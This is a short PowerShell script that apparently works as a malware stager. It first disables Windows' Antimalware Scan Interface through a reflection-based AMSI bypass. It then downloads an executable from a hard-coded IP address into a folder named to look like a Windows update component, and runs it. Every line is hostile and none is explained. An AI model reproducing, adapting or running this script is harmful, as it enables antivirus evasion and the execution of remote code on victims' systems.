[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
$brokerscript = Test-path 'c:\Windows\Temp\WindowsUpdateBroker\UpdateSignature.exe'
if ($brokerscript = 'True') {
	Remove-Item –path c:\Windows\Temp\WindowsUpdateBroker\UpdateSignature.exe –recurse -Force
}
(New-Object Net.WebClient).DownloadFile("http://139.59.231.237:9898/UpdateSignature.exe","C:\Windows\Temp\WindowsUpdateBroker\UpdateSignature.exe")
& 'C:\Windows\Temp\WindowsUpdateBroker\UpdateSignature.exe'